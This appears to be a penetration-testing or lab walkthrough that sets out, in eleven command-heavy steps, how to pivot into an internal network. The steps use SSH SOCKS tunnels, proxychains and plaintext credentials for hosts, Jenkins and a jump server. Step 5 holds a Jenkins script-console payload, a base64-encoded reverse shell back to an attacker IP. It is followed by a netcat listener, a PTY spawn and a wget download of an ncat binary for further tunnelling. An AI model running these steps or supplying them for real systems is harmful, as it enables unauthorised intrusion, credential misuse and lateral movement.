# Shortcut

- [Shortcut](#shortcut)

---

To get access to the internal network, do the following steps:

1) SSH tunnel on 192.168.8.3 (Credential: `iyer` / `Iyer@123`)

```
sudo -u brian ssh -N -D 9050 iyer@192.168.8.3
```

<br/>

2) Edit `/etc/proxychains.conf`. Make sure only socks4 is enabled.

```
socks4 127.0.0.1 9050
```

<br/>

3) With foxyproxy forwarding traffic to SOCK4 server 127.0.0.1:9050, login Jenkins (http://10.1.3.1:1234/) with the credential `autoadmin` / `Jenk!nsADMIN`

<br/>

4) Locally launch a netcat listener.

```
nc -nlvp 443
```

<br/>

5) On Jenkins, go to http://10.1.3.1:1234/script. Then use the following script to get a reverse shell:

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMS80NDMgMD4mMScK}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

<br/>

6) On the reverse shell, get ncat (https://github.com/ZephrFish/static-tools/raw/master/ncat) from the local machine:

* Local:

```
python3 -m http.server 80
```

* Remote:
```
python -c 'import pty; pty.spawn("/bin/bash")'
cd /tmp && wget http://192.168.100.11/ncat
```

<br/>

7) Create another HTTP proxy via SSH tunnel using ncat:

```
chmod +x ncat && ./ncat -l 4444 --proxy-type http &
```

```
ssh -R 4445:127.0.0.1:4444 brian@192.168.100.11
```

<br/>

8) Modify `/etc/proxychains.conf` to use the HTTP proxy:

```
nano /etc/proxychains.conf
```

Disable the sock4 proxy and add the following:
```
http 127.0.0.1 4445
```

<br/>

9) SSH to the jump server using `jump-admin` / `B@DB!tch`:

```
proxychains ssh jump-admin@10.1.1.4
```

<br/>

10) Use the Jump Server as socks4 proxy:

```
proxychains ssh -N -D 9051 jump-admin@10.1.1.4
```

<br/>

11) Change `/etc/proxychains.conf`:

```
nano /etc/proxychains.conf

sock4 127.0.0.1 9051
```

